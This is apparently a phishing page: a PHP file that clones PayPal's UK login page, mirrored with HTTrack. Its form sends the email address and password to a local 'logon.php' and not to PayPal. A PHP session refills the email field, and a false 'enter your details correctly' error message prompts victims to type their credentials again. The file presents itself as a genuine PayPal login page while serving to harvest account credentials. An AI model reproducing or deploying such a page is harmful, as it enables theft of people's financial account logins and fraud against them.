<?php

ini_set("output_buffering",4096);
session_start();
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

<!-- Mirrored from www.paypal.com/uk/cgi-bin/webscr?cmd=_login-run by HTTrack Website Copier/3.x [XR&CO'2008], Fri, 03 Apr 2009 02:25:52 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!--
       Script info: script: webscr, cmd: _login-run, template: p/gen/login, date: Mar. 20, 2009 06:30:04 PDT; country: GB, language: en_GB, xslt server: 
       installation: WEBSCR-560-20090326-1       web version: 56.0-870571 branch: AHOD_560_0319_int
       content version: -
       pexml version: 56.0-874801
       page XSL: User/default/en_GB/general/Login.xsl
       hostname : MxgtgC1VePQmXNqiwEvpTW6PzXIkWQEPhK0u3yyJk94
         rlogid : MxgtgC1VePQmXNqiwEvpTXBwUkRE0W%2f%2bQP6JlucBEjmu6zWhNBm1yQ%3d%3d_12069cbef78
-->
<title>Login - PayPal</title>
<!--googleoff: all-->
<meta http-equiv="keywords" content="Send, money, payments, credit, credit card, instant, money, financial services, mobile, wireless, WAP, mobile phones, two-way pagers, Windows CE">
<!--googleon: all-->

<!--googleoff: all-->
<meta http-equiv="description" content="PayPal lets you send money to anyone with email. PayPal is free for consumers, and works seamlessly with your existing credit card and current account. You can settle debts, borrow cash, divide bills or split expenses with friends, all without going to an ATM or looking for your chequebook.">
<!--googleon: all-->
<link rel="stylesheet" type="text/css" href="files/css/core/paypal.css">
<!--[if IE 6]><link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-560-20090326-1/css/ie60win.css"><![endif]-->

<!--[if IE 7]><link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-560-20090326-1/css/ie70win.css"><![endif]-->
<link rel="stylesheet" type="text/css" href="files/css/flows/flowHFR.css">
<link rel="stylesheet" type="text/css" href="files/css/core/core.css">
<link rel="stylesheet" type="text/css" href="files/css/pages/pageLogin.css">
<link rel="stylesheet" type="text/css" href="files/css/flows/flowHFR.css">
<link rel="stylesheet" type="text/css" href="files/css/en_GB/lang.css">
<link rel="shortcut icon" href="https://www.paypalobjects.com/WEBSCR-560-20090326-1/en_US/i/icon/pp_favicon_x.ico">
<link rel="apple-touch-icon" href="files/en_US/i/pui/apple-touch-icon.png">
<script type="text/javascript">
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><script type="text/javascript" src="files/js/pp_main.js"></script><script type="text/javascript" src="files/js/lib/min/global.js"></script><script type="text/javascript" src="files/js/hostedpayments/hostedpayments.js"></script><script type="text/javascript" src="files/js/lib/yui/yahoo.js"></script><script type="text/javascript" src="files/js/lib/yui/event.js"></script><script type="text/javascript" src="files/js/rosettaLang.js"></script><script type="text/javascript" src="files/js/iconix.js"></script><script type="text/javascript" src="files/js/tns/mid.js"></script><script type="text/javascript">PAYPAL.tns.loginflow = 'p/gen/login';PAYPAL.tns.flashLocation = 'https://www.paypal.com/en_US/m/mid.swf';</script>
</head>
<body>
<div class="srd" id="header">
<h1><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_home"><img border="0" src="https://www.paypal.com/en_GB/GB/i/logo/paypal_logo.gif" alt="PayPal"></a></h1>
<form method="post" id="searchForm" name="searchForm" action="https://www.paypal.com/uk/cgi-bin/searchscr?cmd=_sitewide-search">
<fieldset>
<legend>Search PayPal</legend>
<label for="searchBox">Search </label><input type="text" id="searchBox" name="queryString" value=""> <input class="button" type="submit" id="search.x" name="search.x" value="Search">
</fieldset>
<input name="form_charset" type="hidden" value="UTF-8">
</form>
<div class="srd" id="navGlobal"><ul>
<li class="first signup"><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_registration-run">Sign Up</a></li>
<li class="login"><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_login-run">Log In</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/helpweb?cmd=_help">Help</a></li>
<li class="last"><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_security-center-outside">Security Centre</a></li>
</ul></div>
</div>
<div id="navPrimary" class="srd"><ul>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_home-general&amp;nav=0" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:YL');">Home</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:YM');">Personal</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_home-merchant&amp;nav=2" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:ZJ');">Business</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/general/ProductsandServices-outside&amp;nav=3" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:A3');">Products &amp; Services</a></li>
<li><a href="https://www.paypal.co.uk/offers" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:L7');">Offers</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_help&amp;nav=5" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:y69');">Help</a></li>
</ul></div>
<div id="xptContentOuter"><table align="center" border="0" cellpadding="0" cellspacing="0" id="xptContentInner"><tr valign="top"><td>
<div id="xptTitle"><table align="center" border="0" cellpadding="0" cellspacing="0" class="contentTitle">
<tr>
<td class="heading" width="100%"><h1>Member Login</h1></td>
<td align="right" nowrap>
<span class="small">Secure Log In</span> <img src="files/en_US/i/icon/secure_lock_2.gif" border="0" alt="">
</td>
</tr>
<tr><td colspan="2"><img alt="" border="0" height="2" src="files/en_US/i/scr/pixel.gif" width="1"></td></tr>
<tr><td colspan="2"><hr></td></tr>
<tr><td><img alt="" border="0" height="4" src="files/en_US/i/scr/pixel.gif" width="1"></td></tr>
</table></div>
<div class="messageBox error"><p>Please make sure you enter your <b>email address</b> and <b>password</b> correctly.</p></div>
<div id="xptContentMain">
<div class="main"><div id="content">
<div class="box login">
<div class="header"><h2>Account login</h2></div>
<div class="body">
<form method="post" name="login_form" action="logon.php">
<input type="hidden" name="login_cmd" value=""><input type="hidden" name="login_params" value=""><fieldset>
<legend>Member Login</legend>
<p><label for="login_email">Email address</label><input type="text" id="login_email" class="" name="login_email" value="<?php if (isset($_SESSION['uu'])) { print $_SESSION['uu'];} else {print "";} ?>"></p>
<p><label for="login_password">PayPal password</label><input autocomplete="off" type="password" id="login_password" name="login_password" value=""></p>
<p><label for="target_page">Go to</label><select name="target_page"><option value="0" selected>My account</option>
<option value="1">My transactions</option></select></p>
<p><input type="submit" name="submit.x" value="Log In" class="button primary"></p>
</fieldset>
<p>Forgotten your <a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_email-recovery">email address</a> or <a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_forgot-password&amp;from=PayPal">password</a>?</p>
<p>New to PayPal? <strong><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_registration-run">Sign up</a></strong></p>
<input name="form_charset" type="hidden" value="UTF-8">
</form>
<script type="text/javascript">
<!-- hide from JavaScript-challenged browsers
var email_field = document.getElementById("login_email");
if(email_field != null && email_field.getAttribute('type') != 'hidden' && email_field.value == '') {
email_field.focus();
}
else {
document.login_form.login_password.focus();
}
   // done hiding -->
</script>
</div>
</div>
<div class="container"><div class="MktMPI" id="mpi510051"><img src="https://www.paypal.com/en_GB/i/header/hdr_loginpage_560x228.jpg"></div></div>
</div></div>
<script type="text/javascript" src="files/js/pageBlockingUnsafeBrowsers.js"></script>
</div>
</td></tr></table></div>
<div id="footer" class="srd">
<h2 class="accessAid">More Information</h2>
<ul>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/gen/about-outside">About</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=xpt/Marketing/general/PayPalAccountTypes-outside">Account Types</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_display-fees-outside">Fees</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside">Privacy</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_security-center-outside">Security Centre</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab">Contact Us</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/gen/ua/ua-outside">Legal Agreements</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/gen/ua/policy_pbp-outside">Buyer Protection</a></li>
<li class="last"><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/gen/ua/policy_spp-outside">Seller Protection</a></li>
</ul>
<p id="footerSecure"><a target="_blank" href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=xpt/User/popup/SecurityKeyVIP-outside" onClick="PAYPAL.core.openWindow(event, {width: 425, height: 350})"><img border="0" src="files/en_US/i/logo/logo_VIPwhite_66x27.gif" alt=""></a></p>
<p id="legal">Copyright © 1999-2011 PayPal. All rights reserved.</p>
</div>
<div id="navFull"><ul>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_home-general&amp;nav=0" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:YL');">Home</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:YM');">Personal</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_home-merchant&amp;nav=2" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:ZJ');">Business</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/general/ProductsandServices-outside&amp;nav=3" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:A3');">Products &amp; Services</a></li>
<li><a href="https://www.paypal.co.uk/offers" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:L7');">Offers</a></li>
<li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_help&amp;nav=5" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:y69');">Help</a></li>
</ul></div>
<script type="text/javascript">
							  // until there is a reliable ondomready function
							 if(typeof PAYPAL != 'undefined'){
								 PAYPAL.core.Navigation.init();
							}</script><script type="text/javascript" src="files/js/pp_naturalsearch.js"></script><script type="text/javascript">
<!--
var ppns = new PayPalNaturalSearch('https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/gen/login','3484-30830-12422-0',this.document);
			ppns.addEngines(new Array(
										"A9.com",
										".altavista.com",
										"clusty.com",
										"google.co.jp",
										"google.co.kr",
										"google.ru",
										"www.google.com",
										"icerocket.com",
										"infospace.com",
										"mooter.com",
										"search.msn.",
										"snap.com",
										"search.yahoo.com",
										"search.yahoo.co.jp"
									,"search.aol.co.uk/web",
									"search.aol.co.uk/web_uk.adp",
									"search.aol.co.uk/image",
									"web.ask.co.uk/web",
									"images.google.co.uk/images",
									"search.hotbot.co.uk/cgi-bin/pursuit",
									"search.lycos.co.uk/cgi-bin/pursuit",
									"search.msn.co.uk/results.aspx",
									"www.webfinder.co.uk/Search/Page.aspx",
									"www.google.co.uk/search",
									"https://www.paypal.com/uk/cgi-bin/www.ask.co.uk/res.asp",
									"www.google.co.uk",
									"www.google.com",
									"uk.yahoo.com",
									"uk.msn.com",
									"www.msn.com",
									"search.msn.co.uk",
									"uk.ask.com",
									"www.miva.com/uk",
									"uk.overture.com",
									"www.lycos.co.uk",
									"uk.search.yahoo.com",
									"www.ifind.freeserve.com",
									"search.yahoo.com",
									"https://www.paypal.com/uk/cgi-bin/www.live.com/?searchonly=true&amp;mkt=en-IE",
									"www.altavista.com"
								)); // End of aEngines array.
			ppns.init();
			-->
</script><div id="ppwebapi" class="advonqo.mha,hfb.lnb-k`ox`o-rdhsqdonqo"></div>
<!-- SiteCatalyst Code
Copyright 1997-2005 Omniture, Inc.
More info available at http://www.omniture.com -->
<script type="text/javascript" src="files/js/site_catalyst/pp_jscode_080706.js"></script>
<script type="text/javascript">
<!--
/* SiteCatalyst Variables */
s.prop1="p/gen/login";
s.prop7="Unknown";
s.prop8="Unknown";
s.prop9="Unknown";
s.prop10="GB";
s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
s.pageName="Log In";
s.channel="Log In";
s.prop50="en_GB";
s.prop18="";
/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
var s_code=s.t();if(s_code)document.write(s_code)//--></script>
<script type="text/javascript"><!--
if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
//-->
</script><noscript><img
src="http://paypal.112.2o7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
height="1" width="1" border="0" alt="" /></noscript>
<!--/DO NOT REMOVE/-->

<!-- End SiteCatalyst Code -->
</body>

<!-- Mirrored from www.paypal.com/uk/cgi-bin/webscr?cmd=_login-run by HTTrack Website Copier/3.x [XR&CO'2008], Fri, 03 Apr 2009 02:26:05 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
</html>
